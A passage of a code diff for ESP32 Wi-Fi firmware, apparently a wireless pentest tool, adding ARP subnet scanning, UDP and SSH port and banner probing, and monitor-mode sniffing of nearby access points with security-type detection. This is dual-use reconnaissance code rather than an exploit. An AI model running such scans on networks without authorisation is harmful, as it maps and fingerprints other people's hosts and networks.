+    const ip4_addr_t *ip_ret = NULL;
+    
+    s8_t arp_idx = etharp_find_addr(NULL, &target_addr, &eth_ret, &ip_ret);
+    if (arp_idx >= 0 && eth_ret) {
+        memcpy(mac, eth_ret->addr, 6);
+        return true;
+    }
+
+    return false;
+}
+
+bool wifi_manager_arp_scan_subnet(void) {
+    arp_scanner_ctx_t *ctx = arp_scanner_init();
+    if (!ctx) {
+        TERMINAL_VIEW_ADD_TEXT("Failed to initialize ARP scanner context\n");
+        return false;
+    }
+
+    // Get subnet information using existing function
+    scanner_ctx_t temp_ctx;
+    if (!get_subnet_prefix(&temp_ctx)) {
+        TERMINAL_VIEW_ADD_TEXT("Failed to get network information. Make sure WiFi is connected.\n");
+        arp_scanner_cleanup(ctx);
+        return false;
+    }
+
+    strncpy(ctx->subnet_prefix, temp_ctx.subnet_prefix, sizeof(ctx->subnet_prefix) - 1);
+
+    char scan_msg[64];
+    snprintf(scan_msg, sizeof(scan_msg), "Starting ARP scan on %s0/24\n", ctx->subnet_prefix);
+    TERMINAL_VIEW_ADD_TEXT(scan_msg);
+
+    TERMINAL_VIEW_ADD_TEXT("Scanning network using ARP requests...\n");
+    printf("Starting ARP scan on %s1-%d\n", ctx->subnet_prefix, END_HOST);
+    ESP_LOGI(TAG, "Starting ARP scan, scanning %s1-%d", ctx->subnet_prefix, END_HOST);
+    
+    ctx->num_active_hosts = 0;
+    const int batch_size = 10;
+    
+    for (int batch_start = START_HOST; batch_start <= END_HOST; batch_start += batch_size) {
+        int batch_end = (batch_start + batch_size - 1 > END_HOST) ? END_HOST : batch_start + batch_size - 1;
+        
+        // Progress update
+        char progress_msg[64];
+        snprintf(progress_msg, sizeof(progress_msg), "Scanning %s%d-%d...\n", ctx->subnet_prefix, batch_start, batch_end);
+        TERMINAL_VIEW_ADD_TEXT(progress_msg);
+        printf("Scanning %s%d-%d...\n", ctx->subnet_prefix, batch_start, batch_end);
+        
+        ESP_LOGI(TAG, "Sending ARP batch %d-%d", batch_start, batch_end);
+        
+        // Send batch of ARP requests using lwIP
+        for (int host = batch_start; host <= batch_end; host++) {
+            char current_ip[26];
+            snprintf(current_ip, sizeof(current_ip), "%s%d", ctx->subnet_prefix, host);
+            
+            send_arp_request_lwip(current_ip);
+            vTaskDelay(pdMS_TO_TICKS(10)); // Small delay between requests
+        }
+        
+        // Wait for responses to arrive
+        vTaskDelay(pdMS_TO_TICKS(250));
+        
+        // Check ARP table for this batch
+        for (int host = batch_start; host <= batch_end; host++) {
+            char current_ip[26];
+            snprintf(current_ip, sizeof(current_ip), "%s%d", ctx->subnet_prefix, host);
+            
+            uint8_t mac[6];
+            if (get_arp_table_entry(current_ip, mac)) {
+                if (ctx->num_active_hosts < ctx->max_hosts) {
+                    strncpy(ctx->hosts[ctx->num_active_hosts].ip, current_ip, sizeof(ctx->hosts[ctx->num_active_hosts].ip) - 1);
+                    memcpy(ctx->hosts[ctx->num_active_hosts].mac, mac, 6);
+                    ctx->hosts[ctx->num_active_hosts].is_active = true;
+                    ctx->num_active_hosts++;
+
+
+                }
+            }
+        }
+        
+        // Progress update every 5 batches or at end
+        if ((batch_end - START_HOST + 1) % 50 == 0 || batch_end == END_HOST) {
+            char status_msg[64];
+            snprintf(status_msg, sizeof(status_msg), "Progress: %d/%d scanned, %zu hosts found\n", 
+                    batch_end - START_HOST + 1, END_HOST - START_HOST + 1, ctx->num_active_hosts);
+            TERMINAL_VIEW_ADD_TEXT(status_msg);
+            printf("Progress: %d/%d scanned, %zu hosts found\n", 
+                    batch_end - START_HOST + 1, END_HOST - START_HOST + 1, ctx->num_active_hosts);
+            ESP_LOGI(TAG, "Progress: %d/%d, found %zu hosts so far", 
+                    batch_end - START_HOST + 1, END_HOST - START_HOST + 1, ctx->num_active_hosts);
+        }
+    }
+
+    // Final summary
+    TERMINAL_VIEW_ADD_TEXT("\n=== ARP Scan Results ===\n");
+    printf("\n=== ARP Scan Results ===\n");
+    
+    char result_msg[64];
+    snprintf(result_msg, sizeof(result_msg), "Found %zu active hosts on %s0/24:\n", ctx->num_active_hosts, ctx->subnet_prefix);
+    TERMINAL_VIEW_ADD_TEXT(result_msg);
+    printf("Found %zu active hosts on %s0/24:\n", ctx->num_active_hosts, ctx->subnet_prefix);
+    
+    if (ctx->num_active_hosts > 0) {
+        TERMINAL_VIEW_ADD_TEXT("\nActive hosts:\n");
+        printf("\nActive hosts:\n");
+        
+        for (size_t i = 0; i < ctx->num_active_hosts; i++) {
+            char host_entry[80];
+            snprintf(host_entry, sizeof(host_entry), "%2zu. %s [%02X:%02X:%02X:%02X:%02X:%02X]\n",
+                    i + 1,
+                    ctx->hosts[i].ip,
+                    ctx->hosts[i].mac[0], ctx->hosts[i].mac[1], ctx->hosts[i].mac[2],
+                    ctx->hosts[i].mac[3], ctx->hosts[i].mac[4], ctx->hosts[i].mac[5]);
+            TERMINAL_VIEW_ADD_TEXT(host_entry);
+            printf("%2zu. %s [%02X:%02X:%02X:%02X:%02X:%02X]\n",
+                    i + 1,
+                    ctx->hosts[i].ip,
+                    ctx->hosts[i].mac[0], ctx->hosts[i].mac[1], ctx->hosts[i].mac[2],
+                    ctx->hosts[i].mac[3], ctx->hosts[i].mac[4], ctx->hosts[i].mac[5]);
+        }
+    } else {
+        TERMINAL_VIEW_ADD_TEXT("No active hosts found.\n");
+        printf("No active hosts found.\n");
+    }
+    
+    TERMINAL_VIEW_ADD_TEXT("\nARP scan completed.\n");
+    printf("\nARP scan completed.\n");
+    ESP_LOGI(TAG, "ARP scan completed. Found %zu active hosts", ctx->num_active_hosts);
+
+    arp_scanner_cleanup(ctx);
+    return true;
+}
+
 void scan_ports_on_host(const char *target_ip, host_result_t *result) {
     struct sockaddr_in server_addr;
     int sock;
@@ -2255,6 +2901,281 @@ void scan_ports_on_host(const char *target_ip, host_result_t *result) {
     }
 }
 
+static size_t build_udp_probe(uint16_t port, uint8_t *buf, size_t bufsize) {
+    if (port == 53 && bufsize >= 64) {
+        uint8_t *p = buf;
+        uint16_t id = (uint16_t)esp_random();
+        *(uint16_t *)(p + 0) = htons(id);
+        *(uint16_t *)(p + 2) = htons(0x0100);
+        *(uint16_t *)(p + 4) = htons(1);
+        *(uint16_t *)(p + 6) = 0;
+        *(uint16_t *)(p + 8) = 0;
+        *(uint16_t *)(p + 10) = 0;
+        p += 12;
+        const char *name = "example.com";
+        const char *dot = name;
+        while (*dot) {
+            const char *start = dot;
+            while (*dot && *dot != '.') dot++;
+            size_t len = (size_t)(dot - start);
+            *p++ = (uint8_t)len;
+            memcpy(p, start, len);
+            p += len;
+            if (*dot == '.') dot++;
+        }
+        *p++ = 0;
+        *(uint16_t *)p = htons(1);
+        p += 2;
+        *(uint16_t *)p = htons(1);
+        p += 2;
+        return (size_t)(p - buf);
+    }
+    if (port == 123 && bufsize >= 48) {
+        memset(buf, 0, 48);
+        buf[0] = 0x1b;
+        return 48;
+    }
+    if (port == 69 && bufsize >= 64) {
+        uint8_t *p = buf;
+        *(uint16_t *)p = htons(1);
+        p += 2;
+        const char *fname = "test";
+        memcpy(p, fname, strlen(fname));
+        p += strlen(fname);
+        *p++ = 0;
+        const char *mode = "octet";
+        memcpy(p, mode, strlen(mode));
+        p += strlen(mode);
+        *p++ = 0;
+        return (size_t)(p - buf);
+    }
+    if (port == 1900 && bufsize >= 256) {
+        const char *msearch = "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n";
+        size_t len = strlen(msearch);
+        memcpy(buf, msearch, len);
+        return len;
+    }
+    if (bufsize >= 1) {
+        buf[0] = 0x00;
+        return 1;
+    }
+    return 0;
+}
+
+static bool udp_port_is_open(const char *target_ip, uint16_t port, uint32_t wait_ms) {
+    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if (sock < 0) return false;
+
+    struct sockaddr_in addr;
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+    inet_pton(AF_INET, target_ip, &addr.sin_addr.s_addr);
+
+    struct timeval tv;
+    tv.tv_sec = wait_ms / 1000;
+    tv.tv_usec = (wait_ms % 1000) * 1000;
+    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+
+    uint8_t probe[256];
+    size_t probe_len = build_udp_probe(port, probe, sizeof(probe));
+    if (probe_len == 0) {
+        close(sock);
+        return false;
+    }
+    sendto(sock, probe, probe_len, 0, (struct sockaddr *)&addr, sizeof(addr));
+
+    uint8_t buf[512];
+    struct sockaddr_in from;
+    socklen_t fromlen = sizeof(from);
+    int n = recvfrom(sock, buf, sizeof(buf), 0, (struct sockaddr *)&from, &fromlen);
+    if (n > 0) {
+        close(sock);
+        return true;
+    }
+    int err = errno;
+    close(sock);
+    if (err == ECONNREFUSED) return false;
+    return false;
+}
+
+void scan_udp_ports_on_host(const char *target_ip, host_result_t *result) {
+    strcpy(result->ip, target_ip);
+    result->num_open_ports = 0;
+
+    printf("Scanning UDP host: %s\n", target_ip);
+    TERMINAL_VIEW_ADD_TEXT("Scanning UDP host: %s\n", target_ip);
+
+    for (size_t i = 0; i < NUM_UDP_PORTS; i++) {
+        if (result->num_open_ports >= MAX_OPEN_PORTS) break;
+        uint16_t port = UDP_COMMON_PORTS[i];
+        if (udp_port_is_open(target_ip, port, 40)) {
+            result->open_ports[result->num_open_ports++] = port;
+            printf("%s - UDP %d responded\n", target_ip, port);
+            TERMINAL_VIEW_ADD_TEXT("%s - UDP %d responded\n", target_ip, port);
+        }
+        vTaskDelay(pdMS_TO_TICKS(2));
+    }
+}
+
+bool scan_ip_udp_port_range(const char *target_ip, uint16_t start_port, uint16_t end_port) {
+    scanner_ctx_t *ctx = scanner_init();
+    if (!ctx) {
+        printf("Failed to initialize scanner context\n");
+        TERMINAL_VIEW_ADD_TEXT("Failed to initialize scanner context\n");
+        return false;
+    }
+
+    ctx->num_active_hosts = 1;
+    host_result_t *result = &ctx->results[0];
+    strcpy(result->ip, target_ip);
+    result->num_open_ports = 0;
+
+    printf("Scanning %s UDP ports %d-%d\n", target_ip, start_port, end_port);
+    TERMINAL_VIEW_ADD_TEXT("Scanning %s UDP ports %d-%d\n", target_ip, start_port, end_port);
+
+    uint16_t ports_scanned = 0;
+    uint16_t total_ports = end_port - start_port + 1;
+
+    for (uint16_t port = start_port; port <= end_port; port++) {
+        if (result->num_open_ports >= MAX_OPEN_PORTS) break;
+        ports_scanned++;
+        if (ports_scanned % 200 == 0) {
+            printf("UDP Progress: %d/%d ports scanned (%.1f%%)\n", ports_scanned, total_ports,
+                   (float)ports_scanned / total_ports * 100);
+            TERMINAL_VIEW_ADD_TEXT("UDP Progress: %d/%d ports scanned (%.1f%%)\n", ports_scanned,
+                                   total_ports, (float)ports_scanned / total_ports * 100);
+        }
+        if (udp_port_is_open(target_ip, port, 40)) {
+            result->open_ports[result->num_open_ports++] = port;
+            printf("%s - UDP %d responded\n", target_ip, port);
+            TERMINAL_VIEW_ADD_TEXT("%s - UDP %d responded\n", target_ip, port);
+        }
+        vTaskDelay(pdMS_TO_TICKS(2));
+    }
+
+    for (size_t i = 0; i < ctx->num_active_hosts; i++) {
+        if (ctx->results[i].num_open_ports > 0) {
+            printf("Host %s has %d udp ports responding\n", ctx->results[i].ip,
+                   ctx->results[i].num_open_ports);
+            TERMINAL_VIEW_ADD_TEXT("Host %s has %d udp ports responding\n", ctx->results[i].ip,
+                                   ctx->results[i].num_open_ports);
+        }
+    }
+
+    scanner_cleanup(ctx);
+    return true;
+}
+
+void scan_ssh_on_host(const char *target_ip, host_result_t *result) {
+    struct sockaddr_in server_addr;
+    int sock;
+    int scan_result;
+    struct timeval timeout;
+    fd_set fdset;
+    int flags;
+    char banner[256];
+    ssize_t bytes_read;
+    
+    ESP_LOGI("SSH_SCAN", "Starting SSH scan on host: %s", target_ip);
+    
+    strcpy(result->ip, target_ip);
+    result->num_open_ports = 0;
+    
+    server_addr.sin_family = AF_INET;
+    inet_pton(AF_INET, target_ip, &server_addr.sin_addr.s_addr);
+    
+    printf("SSH scanning host: %s\n", target_ip);
+    TERMINAL_VIEW_ADD_TEXT("SSH scanning host: %s\n", target_ip);
+    
+    uint16_t ssh_ports[] = {22, 2222, 2022};
+    size_t num_ssh_ports = sizeof(ssh_ports) / sizeof(ssh_ports[0]);
+    
+    for (size_t i = 0; i < num_ssh_ports; i++) {
+        if (result->num_open_ports >= MAX_OPEN_PORTS)
+            break;
+            
+        uint16_t port = ssh_ports[i];
+        ESP_LOGI("SSH_SCAN", "Testing port %d on %s", port, target_ip);
+        printf("Testing SSH port %d on %s...", port, target_ip);
+        TERMINAL_VIEW_ADD_TEXT("Testing SSH port %d on %s...", port, target_ip);
+        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if (sock < 0) {
+            ESP_LOGE("SSH_SCAN", "Failed to create socket for port %d: errno=%d", port, errno);
+            continue;
+        }
+            
+        flags = fcntl(sock, F_GETFL, 0);
+        fcntl(sock, F_SETFL, flags | O_NONBLOCK);
+        
+        server_addr.sin_port = htons(port);
+        ESP_LOGD("SSH_SCAN", "Attempting connection to %s:%d", target_ip, port);
+        scan_result = connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr));
+        
+        if (scan_result < 0 && errno == EINPROGRESS) {
+            timeout.tv_sec = 3;
+            timeout.tv_usec = 0;
+            
+            FD_ZERO(&fdset);
+            FD_SET(sock, &fdset);
+            
+            scan_result = select(sock + 1, NULL, &fdset, NULL, &timeout);
+            
+            if (scan_result > 0) {
+                int error = 0;
+                socklen_t len = sizeof(error);
+                if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &error, &len) >= 0 && error == 0) {
+                    ESP_LOGI("SSH_SCAN", "Port %d is OPEN on %s", port, target_ip);
+                    result->open_ports[result->num_open_ports++] = port;
+                    
+                    fcntl(sock, F_SETFL, flags & ~O_NONBLOCK);
+                    
+                    timeout.tv_sec = 2;
+                    timeout.tv_usec = 0;
+                    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
+                    
+                    memset(banner, 0, sizeof(banner));
+                    bytes_read = recv(sock, banner, sizeof(banner) - 1, 0);
+                    ESP_LOGD("SSH_SCAN", "Received %d bytes from %s:%d", (int)bytes_read, target_ip, port);
+                    
+                    if (bytes_read > 0) {
+                        banner[bytes_read] = '\0';
+                        char *newline = strchr(banner, '\r');
+                        if (newline) *newline = '\0';
+                        newline = strchr(banner, '\n');
+                        if (newline) *newline = '\0';
+                        
+                        ESP_LOGI("SSH_SCAN", "SSH banner from %s:%d: %s", target_ip, port, banner);
+                        printf(" OPEN: %s\n", banner);
+                        TERMINAL_VIEW_ADD_TEXT(" OPEN: %s\n", banner);
+                    } else {
+                        printf(" OPEN (no banner)\n");
+                        TERMINAL_VIEW_ADD_TEXT(" OPEN (no banner)\n");
+                    }
+                } else {
+                    ESP_LOGD("SSH_SCAN", "Port %d connection failed on %s (getsockopt error)", port, target_ip);
+                    printf(" CLOSED\n");
+                    TERMINAL_VIEW_ADD_TEXT(" CLOSED\n");
+                }
+            } else {
+                ESP_LOGD("SSH_SCAN", "Port %d timeout on %s (select result: %d)", port, target_ip, scan_result);
+                printf(" TIMEOUT\n");
+                TERMINAL_VIEW_ADD_TEXT(" TIMEOUT\n");
+            }
+        } else {
+            ESP_LOGD("SSH_SCAN", "Port %d immediate connection failure on %s (errno: %d)", port, target_ip, errno);
+            printf(" CLOSED\n");
+            TERMINAL_VIEW_ADD_TEXT(" CLOSED\n");
+        }
+        
+        close(sock);
+        vTaskDelay(pdMS_TO_TICKS(50));
+    }
+    
+    printf("SSH scan completed on %s - found %d open ports\n", target_ip, result->num_open_ports);
+    TERMINAL_VIEW_ADD_TEXT("SSH scan completed on %s - found %d open ports\n", target_ip, result->num_open_ports);
+}
+
 void scanner_cleanup(scanner_ctx_t *ctx) {
     if (ctx) {
         if (ctx->results) {
@@ -2291,7 +3212,29 @@ bool wifi_manager_scan_subnet() {
         if (is_host_active(current_ip)) {
             printf("Found active host: %s\n", current_ip);
             TERMINAL_VIEW_ADD_TEXT("Found active host: %s\n", current_ip);
-            scan_ports_on_host(current_ip, &ctx->results[ctx->num_active_hosts]);
+
+            host_result_t tcp_result;
+            host_result_t udp_result;
+
+            scan_ports_on_host(current_ip, &tcp_result);
+            scan_udp_ports_on_host(current_ip, &udp_result);
+
+            ctx->results[ctx->num_active_hosts] = tcp_result;
+
+            if (udp_result.num_open_ports > 0) {
+                printf("UDP ports responding on %s:\n", current_ip);
+                TERMINAL_VIEW_ADD_TEXT("UDP ports responding on %s:\n", current_ip);
+                for (uint8_t k = 0; k < udp_result.num_open_ports; k++) {
+                    char line[32];
+                    snprintf(line, sizeof(line), "  UDP %d\n", udp_result.open_ports[k]);
+                    printf("%s", line);
+                    TERMINAL_VIEW_ADD_TEXT(line);
+                }
+            } else {
+                printf("No UDP responses on %s\n", current_ip);
+                TERMINAL_VIEW_ADD_TEXT("No UDP responses on %s\n", current_ip);
+            }
+
             ctx->num_active_hosts++;
         }
     }
@@ -2665,7 +3608,80 @@ void wifi_manager_stop_deauth() {
     }
 }
 
-// Print the scan results and match BSSID to known companies
+static void wifi_manager_print_ap_entry_formatted(uint16_t idx, const wifi_ap_record_t *rec, bool include_security) {
+    char sanitized_ssid[33];
+    sanitize_ssid_and_check_hidden((uint8_t *)rec->ssid, sanitized_ssid, sizeof(sanitized_ssid));
+
+    ECompany company = match_bssid_to_company(rec->bssid);
+    const char *company_str = "Unknown";
+    switch (company) {
+        case COMPANY_DLINK: company_str = "DLink"; break;
+        case COMPANY_NETGEAR: company_str = "Netgear"; break;
+        case COMPANY_BELKIN: company_str = "Belkin"; break;
+        case COMPANY_TPLINK: company_str = "TPLink"; break;
+        case COMPANY_LINKSYS: company_str = "Linksys"; break;
+        case COMPANY_ASUS: company_str = "ASUS"; break;
+        case COMPANY_ACTIONTEC: company_str = "Actiontec"; break;
+        default: company_str = "Unknown"; break;
+    }
+
+    printf("[%u] SSID: %s,\n"
+           "     BSSID: %02X:%02X:%02X:%02X:%02X:%02X,\n"
+           "     RSSI: %d,\n"
+           "     Channel: %d,\n",
+           idx,
+           sanitized_ssid,
+           rec->bssid[0], rec->bssid[1], rec->bssid[2], rec->bssid[3], rec->bssid[4], rec->bssid[5],
+           rec->rssi,
+           rec->primary);
+    TERMINAL_VIEW_ADD_TEXT("[%u] SSID: %s,\n"
+                           "     BSSID: %02X:%02X:%02X:%02X:%02X:%02X,\n"
+                           "     RSSI: %d,\n"
+                           "     Channel: %d,\n",
+                           idx,
+                           sanitized_ssid,
+                           rec->bssid[0], rec->bssid[1], rec->bssid[2], rec->bssid[3], rec->bssid[4], rec->bssid[5],
+                           rec->rssi,
+                           rec->primary);
+
+#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
+    if (include_security) {
+        int ch = rec->primary;
+        const char *band_str = (ch > 14) ? "5GHz" : "2.4GHz";
+        printf("     Band: %s,\n", band_str);
+        TERMINAL_VIEW_ADD_TEXT("     Band: %s,\n", band_str);
+
+        const char *auth_str = "Unknown";
+        const char *pmf_str = NULL;
+        switch (rec->authmode) {
+            case WIFI_AUTH_OPEN: auth_str = "Open"; break;
+            case WIFI_AUTH_WEP: auth_str = "WEP"; break;
+            case WIFI_AUTH_WPA_PSK: auth_str = "WPA"; break;
+            case WIFI_AUTH_WPA2_PSK: auth_str = "WPA2"; break;
+            case WIFI_AUTH_WPA_WPA2_PSK: auth_str = "WPA/WPA2"; break;
+            case WIFI_AUTH_WPA2_ENTERPRISE: auth_str = "WPA2-Enterprise"; break;
+            case WIFI_AUTH_WPA3_PSK: auth_str = "WPA3"; pmf_str = "Required"; break;
+            case WIFI_AUTH_WPA2_WPA3_PSK: auth_str = "WPA2/WPA3"; pmf_str = "Required (WPA3)"; break;
+            case WIFI_AUTH_WAPI_PSK: auth_str = "WAPI"; break;
+            case WIFI_AUTH_WPA3_ENTERPRISE: auth_str = "WPA3-Enterprise"; pmf_str = "Required"; break;
+            default: auth_str = "Unknown"; break;
+        }
+        if (pmf_str) {
+            printf("     Security: %s\n     PMF: %s\n", auth_str, pmf_str);
+            TERMINAL_VIEW_ADD_TEXT("     Security: %s\n     PMF: %s\n", auth_str, pmf_str);
+        } else {
+            printf("     Security: %s\n", auth_str);
+            TERMINAL_VIEW_ADD_TEXT("     Security: %s\n", auth_str);
+        }
+    }
+#endif
+
+    if (strcmp(company_str, "Unknown") != 0) {
+        printf("     Company: %s\n", company_str);
+        TERMINAL_VIEW_ADD_TEXT("     Company: %s\n", company_str);
+    }
+}
+
 void wifi_manager_print_scan_results_with_oui() {
     if (scanned_aps == NULL) {
         printf("AP information not available\n");
@@ -2673,7 +3689,12 @@ void wifi_manager_print_scan_results_with_oui() {
         return;
     }
 
-    for (uint16_t i = 0; i < ap_count; i++) {
+    uint16_t limit = ap_count;
+    if (limit > 50) {
+        limit = 50;
+    }
+
+    for (uint16_t i = 0; i < limit; i++) {
         char sanitized_ssid[33];
         sanitize_ssid_and_check_hidden(scanned_aps[i].ssid, sanitized_ssid, sizeof(sanitized_ssid));
 
@@ -2850,6 +3871,188 @@ void wifi_manager_print_scan_results_with_oui() {
             TERMINAL_VIEW_ADD_TEXT("     Company: %s\n", company_str);
         }
     }
+}
+
+static void live_ap_channel_hop_timer_callback(void *arg) {
+    if (!live_ap_hopping_active) return;
+    live_ap_channel_index = (live_ap_channel_index + 1) % live_ap_channels_len;
+    esp_wifi_set_channel(live_ap_channels[live_ap_channel_index], WIFI_SECOND_CHAN_NONE);
+}
+
+static esp_err_t start_live_ap_channel_hopping(void) {
+    if (live_ap_channel_hop_timer != NULL) {
+        esp_timer_stop(live_ap_channel_hop_timer);
+        esp_timer_delete(live_ap_channel_hop_timer);
+        live_ap_channel_hop_timer = NULL;
+    }
+    live_ap_channel_index = 0;
+    esp_wifi_set_channel(live_ap_channels[live_ap_channel_index], WIFI_SECOND_CHAN_NONE);
+    esp_timer_create_args_t timer_args = {
+        .callback = live_ap_channel_hop_timer_callback,
+        .name = "live_ap_hop"
+    };
+    esp_err_t err = esp_timer_create(&timer_args, &live_ap_channel_hop_timer);
+    if (err != ESP_OK) return err;
+    err = esp_timer_start_periodic(live_ap_channel_hop_timer, SCANSTA_CHANNEL_HOP_INTERVAL_MS * 1000);
+    if (err != ESP_OK) {
+        esp_timer_delete(live_ap_channel_hop_timer);
+        live_ap_channel_hop_timer = NULL;
+        return err;
+    }
+    live_ap_hopping_active = true;
+    return ESP_OK;
+}
+
+static void stop_live_ap_channel_hopping(void) {
+    if (live_ap_channel_hop_timer) {
+        esp_timer_stop(live_ap_channel_hop_timer);
+        esp_timer_delete(live_ap_channel_hop_timer);
+        live_ap_channel_hop_timer = NULL;
+    }
+    live_ap_hopping_active = false;
+}
+
+static bool bssid_already_listed(const uint8_t *bssid) {
+    for (int i = 0; i < ap_count; i++) {
+        if (memcmp(scanned_aps[i].bssid, bssid, 6) == 0) return true;
+    }
+    return false;
+}
+
+static void live_ap_scan_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
+    if (type != WIFI_PKT_MGMT) return;
+    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+    if (pkt->rx_ctrl.sig_len < 36) return;
+    const uint8_t *payload = pkt->payload;
+    uint8_t frame_subtype = (payload[0] & 0xF0) >> 4;
+    if (frame_subtype != 0x08 && frame_subtype != 0x05) return;
+
+    const wifi_ieee80211_packet_t *ipkt = (const wifi_ieee80211_packet_t *)payload;
+    const wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;
+    const uint8_t *bssid = hdr->addr3;
+
+    if (bssid_already_listed(bssid)) return;
+
+    int idx = 36;
+    char ssid[33] = {0};
+    while (idx + 1 < pkt->rx_ctrl.sig_len) {
+        uint8_t id = payload[idx];
+        uint8_t ie_len = payload[idx + 1];
+        if (idx + 2 + ie_len > pkt->rx_ctrl.sig_len) break;
+        if (id == 0 && ie_len <= 32) {
+            memcpy(ssid, &payload[idx + 2], ie_len);
+            ssid[ie_len] = '\0';
+            break;
+        }
+        idx += 2 + ie_len;
+    }
+
+    if (ssid[0] == '\0') {
+        strncpy(ssid, "<hidden>", sizeof(ssid));
+    }
+
+    char sanitized[33];
+    sanitize_ssid_and_check_hidden((uint8_t *)ssid, sanitized, sizeof(sanitized));
+
+    // derive security from IEs
+    bool has_wpa = false;
+    bool has_wpa2 = false;
+    bool has_wpa3 = false;
+    // capability info privacy bit for WEP detection
+    if (pkt->rx_ctrl.sig_len >= 36) {
+        uint16_t cap = (uint16_t)payload[34] | ((uint16_t)payload[35] << 8);
+        // iterate IEs to find RSN/WPA
+        int ie = 36;
+        while (ie + 1 < pkt->rx_ctrl.sig_len) {
+            uint8_t eid = payload[ie];
+            uint8_t elen = payload[ie + 1];
+            if (ie + 2 + elen > pkt->rx_ctrl.sig_len) break;
+            if (eid == 48 /* RSN */ && elen >= 2) {
+                int off = ie + 2;
+                if (off + 2 <= ie + 2 + elen) {
+                    off += 2; // version
+                }
+                if (off + 4 <= ie + 2 + elen) {
+                    off += 4; // group cipher suite
+                }
+                if (off + 2 <= ie + 2 + elen) {
+                    uint16_t pairwise_count = payload[off] | (payload[off + 1] << 8);
+                    off += 2 + 4 * pairwise_count;
+                }
+                if (off + 2 <= ie + 2 + elen) {
+                    uint16_t akm_count = payload[off] | (payload[off + 1] << 8);
+                    off += 2;
+                    for (uint16_t a = 0; a < akm_count; a++) {
+                        if (off + 4 > ie + 2 + elen) break;
+                        // OUI 00:0F:AC
+                        uint8_t oui0 = payload[off + 0];
+                        uint8_t oui1 = payload[off + 1];
+                        uint8_t oui2 = payload[off + 2];
+                        uint8_t type = payload[off + 3];
+                        if (oui0 == 0x00 && oui1 == 0x0F && oui2 == 0xAC) {
+                            if (type == 2) has_wpa2 = true;      // PSK
+                            if (type == 8) has_wpa3 = true;      // SAE
+                        }
+                        off += 4;
+                    }
+                }
+            } else if (eid == 221 /* Vendor */ && elen >= 4) {
+                // WPA (00:50:F2, type 1)
+                if (payload[ie + 2] == 0x00 && payload[ie + 3] == 0x50 && payload[ie + 4] == 0xF2 && payload[ie + 5] == 0x01) {
+                    has_wpa = true;
+                }
+            }
+            ie += 2 + elen;
+        }
+    }
+
+    if (scanned_aps == NULL) {
+        scanned_aps = calloc(MAX_SCANNED_APS, sizeof(wifi_ap_record_t));
+        ap_count = 0;
+    }
+    if (scanned_aps && ap_count < MAX_SCANNED_APS) {
+        wifi_ap_record_t *rec = &scanned_aps[ap_count++];
+        memset(rec, 0, sizeof(*rec));
+        memcpy(rec->bssid, bssid, 6);
+        strncpy((char *)rec->ssid, sanitized, sizeof(rec->ssid));
+        rec->rssi = pkt->rx_ctrl.rssi;
+        rec->primary = pkt->rx_ctrl.channel;
+        // map to closest auth mode
+        if (has_wpa3 && has_wpa2) rec->authmode = WIFI_AUTH_WPA2_WPA3_PSK;
+        else if (has_wpa3) rec->authmode = WIFI_AUTH_WPA3_PSK;
+        else if (has_wpa2) rec->authmode = WIFI_AUTH_WPA2_PSK;
+        else if (has_wpa) rec->authmode = WIFI_AUTH_WPA_PSK;
+        else {
+            // check WEP via privacy bit
+            uint16_t cap = (uint16_t)payload[34] | ((uint16_t)payload[35] << 8);
+            if (cap & 0x0010) rec->authmode = WIFI_AUTH_WEP; else rec->authmode = WIFI_AUTH_OPEN;
+        }
+    }
+
+    uint32_t now_ms = (uint32_t)(esp_timer_get_time() / 1000);
+    if (now_ms - last_live_print_ms < 100) return;
+    last_live_print_ms = now_ms;
+
+    while (live_last_printed_index < ap_count) {
+        uint16_t idx = live_last_printed_index;
+        wifi_ap_record_t *rec = &scanned_aps[idx];
+        wifi_manager_print_ap_entry_formatted(idx, rec, true);
+        live_last_printed_index++;
+    }
+}
+
+void wifi_manager_start_live_ap_scan(void) {
+    ap_manager_stop_services();
+    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
+    ESP_ERROR_CHECK(esp_wifi_start());
+    if (scanned_aps) { free(scanned_aps); scanned_aps = NULL; }
+    ap_count = 0;
+    live_last_printed_index = 0;
+    last_live_print_ms = 0;
+    wifi_manager_start_monitor_mode(live_ap_scan_callback);
+    start_live_ap_channel_hopping();
+    printf("Live AP scan started. Type 'stopscan' to stop.\n");
+    TERMINAL_VIEW_ADD_TEXT("Live AP scan started.\n");
 }
 
 esp_err_t wifi_manager_broadcast_ap(const char *ssid) {
@@ -3042,56 +4245,92 @@ void wifi_manager_start_ip_lookup() {
 }
 
 void wifi_manager_connect_wifi(const char *ssid, const char *password) {
-    wifi_config_t wifi_config = {
-        .sta = {
-            .threshold.authmode = strlen(password) > 8 ? WIFI_AUTH_WPA2_PSK : WIFI_AUTH_OPEN,
-            .pmf_cfg = {.capable = true, .required = false},
-        },
-    };
-
+    printf("Connecting to WiFi: %s\n", ssid);
+    TERMINAL_VIEW_ADD_TEXT("Connecting to WiFi: %s\n", ssid);
+    
+    wifi_config_t wifi_config = {0};
+    
     // Copy SSID and password safely
     strlcpy((char *)wifi_config.sta.ssid, ssid, sizeof(wifi_config.sta.ssid));
     strlcpy((char *)wifi_config.sta.password, password, sizeof(wifi_config.sta.password));
-
+    
+    // Set auth mode - use WPA_WPA2_PSK for better compatibility with modern routers
+    if (strlen(password) > 0) {
+        wifi_config.sta.threshold.authmode = WIFI_AUTH_WPA_WPA2_PSK;
+        wifi_config.sta.pmf_cfg.capable = true;
+        wifi_config.sta.pmf_cfg.required = false;
+    } else {
+        wifi_config.sta.threshold.authmode = WIFI_AUTH_OPEN;
+    }
